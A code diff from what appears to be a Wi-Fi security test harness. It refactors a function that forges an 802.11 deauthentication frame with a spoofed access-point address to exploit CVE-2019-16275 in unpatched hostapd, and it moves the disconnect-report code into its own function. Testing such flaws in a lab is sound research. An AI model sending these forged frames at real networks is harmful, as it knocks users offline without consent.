@@ -1,5 +1,4 @@
 #include <chrono>
-#include <thread>
 #include <nlohmann/json.hpp>
 #include <tins/tins.h>
 
@@ -18,20 +17,19 @@ using namespace filesystem;
 using namespace Tins;
 using namespace chrono;
 
-// CVE-2019-16275 / hostapd advisory 2019-7 //TODO test on version < 3 linux distros //FIXME not tested yet
+// CVE-2019-16275 / hostapd advisory 2019-7
+//TODO test on version < 3 linux distros
 // Deauth FROM AP TO client
-// client with PMF receives it as NL80211_CMD_UNPROT_DEAUTHENTICATE sme_event_unprot_disconnect checks SA==BSSID + reason==CLASS3 → triggers SA Query.
+// client with PMF receives it as NL80211_CMD_UNPROT_DEAUTHENTICATE sme_event_unprot_disconnect checks SA==BSSID + reason==CLASS3 -> triggers SA Query.
 // Unpatched AP (hostapd < 2.10) does not validate SA of received frames, so an attacker can spoof SA=AP_MAC
 // The AP will process or forward in a way that breaks the SA Query exchange
 // patched hostapd (>= 2.10) silently drops frames where SA == own_addr before processing.
 static RadioTap make_deauth(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
-    Dot11Deauthentication frame;
-    frame.addr1(sta_mac); // DA = client
-    frame.addr2(ap_mac);  // SA = AP (forged) - triggers 2019-7 on unpatched AP
+    Dot11Deauthentication frame(sta_mac, ap_mac);
     frame.addr3(ap_mac);  // BSSID
     frame.reason_code(7); // CLASS3_FRAME_FROM_NONASSOC_STA - required by sme_event_unprot_disconnect
 
-    RadioTap rt;
+    RadioTap rt{};
     rt.inner_pdu(frame);
     return rt;
 }
@@ -65,32 +63,34 @@ void run_attack(RunStatus &rs) {
     rs.process_manager.stop_all();
 }
 
+void generate_report(const RunStatus &rs) {
+	vector<unique_ptr<GraphElements>> elements;
+	rs.log_events(elements, {DISCONNECT, CONNECT, TESTER_TAGS});
+
+	const path sta_graph = observer::tshark::tshark_graph(rs, "client", elements);
+	const path ap_graph  = observer::tshark::tshark_graph(rs, "ap", elements);
+
+	report::ReportGuard report(rs.run_folder());
+	if (report) {
+		report << "# Deauth DoS Attack (WPA2)\n\n";
+		report::attack_mapping_table(report, rs);
+		if (!sta_graph.empty()) {
+			report << "### STA (wpa_supplicant " << hostapd::get_version(rs, "client") << ")\n";
+			report << "![STA Graph](" << sta_graph << ")\n\n";
+		}
+		if (!ap_graph.empty()) {
+			report << "### AP (hostapd " << hostapd::get_version(rs, "ap") << ")\n";
+			report << "![AP Graph](" << ap_graph << ")\n\n";
+		}
+		report << "---\n";
+	}
+}
+
 void stats_attack(const RunStatus &rs) {
-    vector<unique_ptr<GraphElements>> elements;
-    rs.log_events(elements, {DISCONNECT, CONNECT, TESTER_TAGS});
 
-    const path sta_graph = observer::tshark::tshark_graph(rs, "client", elements);
-    const path ap_graph  = observer::tshark::tshark_graph(rs, "ap", elements);
+	generate_report(rs);
 
-    // report
-    {
-        report::ReportGuard report(rs.run_folder());
-        if (report) {
-            report << "# Deauth DoS Attack (WPA2)\n\n";
-            report::attack_mapping_table(report, rs);
-            if (!sta_graph.empty()) {
-                report << "### STA (wpa_supplicant " << hostapd::get_version(rs, "client") << ")\n";
-                report << "![STA Graph](" << sta_graph << ")\n\n";
-            }
-            if (!ap_graph.empty()) {
-                report << "### AP (hostapd " << hostapd::get_version(rs, "ap") << ")\n";
-                report << "![AP Graph](" << ap_graph << ")\n\n";
-            }
-            report << "---\n";
-        }
-    }
-
-    nlohmann::json result;
+    nlohmann::json result; // TODO přesunout do parse funkce Entry?
     const auto window = visual::helper::get_run_window(rs);
     result["client_disconnected"] = visual::helper::get_client_disconnected(rs, window);
     // AP-STA-DISCONNECTED fires if AP properly deauths client; INTERFACE-DISABLED fires if
